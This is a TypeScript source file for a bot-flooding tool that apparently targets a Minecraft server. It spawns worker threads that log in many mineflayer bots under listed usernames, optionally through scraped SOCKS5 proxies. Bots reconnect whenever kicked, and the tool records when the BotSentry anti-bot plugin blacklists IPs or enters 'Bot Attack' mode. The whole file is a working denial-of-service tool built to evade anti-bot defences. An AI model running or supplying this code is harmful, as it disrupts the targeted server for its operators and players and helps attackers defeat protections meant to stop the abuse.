import 'colors'
import wt from 'worker_threads'
import { Bot, createBot as createMinecraftBot } from 'mineflayer'
import os from 'os'
import { SocksClient } from 'socks'
import { getRandomArbitrary, shuffleArray, sleep } from 'emberutils'
import ProxyScraper from '../utils/proxy-scrape'
import { server, username, port } from '../config.json'
import {createAttackBot, log} from './shared'

const amount = {
  workers: 10,
  bots: 10
}
const useProxy = false
const useTimeout = false

if (wt.isMainThread) {
  await (async () => {
    // code for main thread only
    log('Starting...'.green)
    log(`Amount of workers: ${amount.workers}`.green)
    log('Importing usernames...'.green)
    const bots = require('../bots.json')
    log(`Amount of usernames: ${bots.length}, will use ${amount.bots * amount.workers} of them`.green)
    log('Shuffling bots array...'.green)
    shuffleArray(bots)
    log('Decreasing the process priority...'.green)
    os.setPriority(19)
    log('Starting worker spawning loop...'.green)
    const array = []
    const wtArray = []
    const proxies = shuffleArray(await ProxyScraper.getProxies({ proxytype: 'socks5' }))
    let proxyI = 0
    for (let i = 0; i < amount.workers; i++) {
      let nickname
      for (let j = 0; j < amount.bots; j++) {
        if (j === 0) nickname = bots[0].username
        else {
          bots.shift()
          shuffleArray(bots)
          nickname = bots[0].username
        }
        array.push(nickname)
        log(`Username ${nickname} ready`.green)
      }
      proxyI++
      const worker = new wt.Worker(__filename, { argv: [array, i, proxies] })
      wtArray.push(worker)
      log(`Summoned worker number ${i + 1}... (${amount.workers - i - 1} left)`.green)
      worker.on('message', message => {
        const delay = (new Date().getTime() - message.date) / 1000
        let delayString: string
        if (delay > 1 && delay < 5) delayString = `${delay}s ago`.yellow
        else if (delay > 5) delayString = `${delay}s ago`.red
        else if (delay === 0.000) delayString = `${delay}s ago`.bgGreen
        else delayString = `${delay}s ago`.green
        if (message.log) console.log(`[${`W${message.id}`.yellow}] [${message.displayDate} (${delayString})] ${message.log.message}`)
      })
    }
    // send "ready" message to each worker
    wtArray.forEach(worker => worker.postMessage({ ready: true }))
  })
} else {
  // code for workers
  (async () => {
    // function to wait until all workers are ready and main thread sends the message to start
    async function awaitReady () {
      return await new Promise<void>(resolve => {
        wt.parentPort!.once('message', async message => {
          // if message object's ready property is "true", resolve
          if (message.ready) resolve()
          // otherwise, keep waiting
          else await awaitReady()
        })
      })
    }

    await awaitReady()
    let i = 0
    let proxyI = 0
    const spaceRegex = /\s{2,}/gm
    const array = process.argv[2].split(',')
    const host = server
    shuffleArray(array)

    const proxyArray = shuffleArray(process.argv[4].split(','))
    for (const username of array) {
      proxyI++

      async function createBot (): Promise<Bot> {
        // join with random delay
        if (useTimeout) {
          // random time in range from 5s to 200s
          const timeout = getRandomArbitrary(5000, 200000)
          log(`[${username}] Waiting for ${timeout / 1000}s before logging in...`)
          // Don't continue until timeout ends
          await sleep(timeout)
        }

        return createAttackBot({
          username: username,
          host: host,
          port: port,
          proxy: useProxy ? {
            proxyHost: proxyArray[proxyI].split(':')[0],
            proxyPort: parseInt(proxyArray[proxyI].split(':')[1])
          } : undefined
        })
      }

      i++
      log(`[${i}/${array.length}] Creating bot ${username}... (${array.length - i} left)`.green)
      const bot = await createBot()

      function botThing () {
        log(`[${username}] Logged in`.green)
        bot.once('messagestr', async function botThing2 (message) {
          if (message === '' || message === ' ' || message === '\u200b' || !message || spaceRegex.test(message)) return
          log(`[${username}] ${message}`.yellow)
          if (message.includes('8b8t')) {
            log(`[${username}] Reached the end of the queue, ending the connection and reconnecting...`.green)
            bot.end()
            await createBot()
            bot.once('login', () => {
              bot.removeAllListeners('messagestr')
              botThing()
            })
          } else bot.once('messagestr', botThing2)
        })
        bot.once('kicked', reason => {
          log(reason)
          reason = JSON.parse(reason).text.toString()
          log(`[${username}] ${reason.red}`.yellow + ', recreating the bot...')
          log(`[${username}] Recreating the bot...`.green)
          bot.end()
          createBot()
          bot.once('login', () => {
            bot.removeAllListeners()
            botThing()
          })
        })
      }

      bot.once('login', botThing)
      bot.once('kicked', reason => {
        const jsonReason = JSON.parse(reason)
        try {
          // blacklisted ip
          if (jsonReason.extra[0].extra[1].text.includes('BotSentry') && jsonReason.extra[0].extra[5].text.includes('IP is blacklisted')) log(`[${username}] IP blacklist by BotSentry`.red)
          // antibot mode on
          else if (jsonReason.extra[0].extra[3].text.includes('Bot Attack')) log(`[${username}] BotSentry AntiBot mode is on for ${jsonReason.extra[0].extra[7]}s`.red)
          // blacklisted for too many online players from single ip
          else if (jsonReason.extra[0].extra[3].text.includes('limit of accounts')) log(`[${username}] IP blacklist for per-IP account limit by BotSentry`.red)
          // first time joining
          else if (jsonReason.extra[0].extra[5].text.includes('dangerous activity')) log(`[${username}] BotSentry is analyzing the connection`.red)
          // something else
          else console.log(jsonReason.extra[0])
        } catch (err) {
          console.log(err)
          console.log(reason)
          console.log(jsonReason)
        }
      })
    }
  })()
}
